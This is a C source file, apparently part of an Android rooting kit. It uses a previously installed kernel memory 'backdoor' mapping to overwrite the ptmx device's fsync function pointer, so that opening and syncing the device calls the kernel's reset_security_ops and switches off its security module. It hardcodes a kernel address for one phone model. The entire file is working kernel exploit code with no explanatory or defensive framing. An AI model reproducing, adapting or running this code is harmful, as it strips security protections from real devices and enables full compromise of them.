#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/system_properties.h>
#define _LARGEFILE64_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "detect_device.h"
#include "ptmx.h"
#include "backdoor_mmap.h"

typedef struct _supported_device {
  int device_id;
  unsigned long int reset_security_ops_address;
} supported_device;

static supported_device supported_devices[] = {
  { DEV_IS17SH_01_00_04,    0xc03215b0 },
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

static void (*reset_security_ops)(void);

static bool
setup_variable(void)
{
  int device_id = detect_device();
  int i;

  for (i = 0; i < n_supported_devices; i++) {
    if (supported_devices[i].device_id == device_id) {
      reset_security_ops = (void *)supported_devices[i].reset_security_ops_address;
      return true;
    }
  }

  reset_security_ops = (void *)kallsyms_get_symbol_address("reset_security_ops");
  return reset_security_ops;
}


void
call_reset_security_ops(void)
{
  reset_security_ops();
}

static bool
run_reset_security_ops(void *user_data)
{
  int fd;

  fd = open(PTMX_DEVICE, O_WRONLY);
  fsync(fd);
  close(fd);

  return true;
}

static bool
run_exploit(void)
{
  void **ptmx_fsync_address;
  unsigned long int ptmx_fops_address;
  int fd;
  bool ret;

  ptmx_fops_address = get_ptmx_fops_address();
  if (!ptmx_fops_address) {
    return false;
  }

  if (!backdoor_open_mmap()) {
    printf("Failed to mmap due to %s.\n", strerror(errno));
    printf("Run 'install_backdoor' first\n");

    return false;
  }

  ptmx_fsync_address = backdoor_convert_to_mmaped_address((void *)ptmx_fops_address + 0x38);
  *ptmx_fsync_address = call_reset_security_ops;

  ret = run_reset_security_ops(NULL);

  *ptmx_fsync_address = NULL;

  backdoor_close_mmap();
  return ret;
}

int
main(int argc, char **argv)
{
  if (!setup_variable()) {
    printf("Failed to get reset_security_ops addresses.\n");
    exit(EXIT_FAILURE);
  }

  run_exploit();

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
